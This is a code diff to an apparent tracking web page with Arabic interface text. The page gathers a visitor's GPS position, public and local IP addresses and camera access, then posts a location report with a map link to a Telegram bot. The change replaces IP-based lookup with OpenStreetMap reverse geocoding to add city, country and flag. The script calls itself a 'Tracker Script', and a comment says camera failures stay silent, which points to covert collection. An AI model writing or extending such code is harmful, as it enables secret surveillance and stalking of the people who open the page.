@@ -54,7 +54,7 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
 🌍 الدولة: ${country ? `${country} ${flagEmoji}` : "❌"}
 
 🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
-      
+
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -69,6 +69,32 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
       }
     }
 
+    function reverseGeocode(lat, lon) {
+      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+      fetch(url, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Tracker Script)'
+        }
+      })
+        .then(res => res.json())
+        .then(data => {
+          const address = data.address || {};
+          city = address.city || address.town || address.village || address.hamlet || "";
+          country = address.country || "";
+          const countryCode = address.country_code ? address.country_code.toUpperCase() : "";
+          flagEmoji = countryCode
+            ? String.fromCodePoint(...[...countryCode].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
+            : "";
+          checkIfReady();
+        })
+        .catch(() => {
+          city = "";
+          country = "";
+          flagEmoji = "";
+          checkIfReady();
+        });
+    }
+
     function getLocation() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
@@ -79,7 +105,7 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
             gpsMsg = `Latitude: ${gpsLat}
 Longitude: ${gpsLon}
 📏 الدقة: ±${acc} متر`;
-            checkIfReady();
+            reverseGeocode(gpsLat, gpsLon); // استخدم OSM هنا
           },
           () => {
             gpsMsg = `❌ فشل تحديد الموقع`;
@@ -93,32 +119,12 @@ Longitude: ${gpsLon}
       }
     }
 
-    function getGeoInfo(ip) {
-      fetch(`https://ipapi.co/${ip}/json/`)
-        .then(res => res.json())
-        .then(data => {
-          city = data.city || "";
-          country = data.country_name || "";
-          const countryCode = data.country || "";
-          flagEmoji = countryCode
-            ? String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
-            : "";
-          checkIfReady();
-        })
-        .catch(() => {
-          city = "";
-          country = "";
-          flagEmoji = "";
-          checkIfReady();
-        });
-    }
-
     function getPublicIP() {
       fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
           publicIP = data.ip;
-          getGeoInfo(publicIP);
+          checkIfReady();
         })
         .catch(() => {
           publicIP = "❌ فشل جلب IP";
@@ -165,11 +171,11 @@ Longitude: ${gpsLon}
           });
         })
         .catch(() => {
-          // فشل الكاميرا بدون عرض رسالة
+          // الكاميرا غير متاحة
         });
     }
 
-    // بدء العمليات
+    // بدء جميع العمليات
     getLocation();
     getPublicIP();
     getLocalIP();
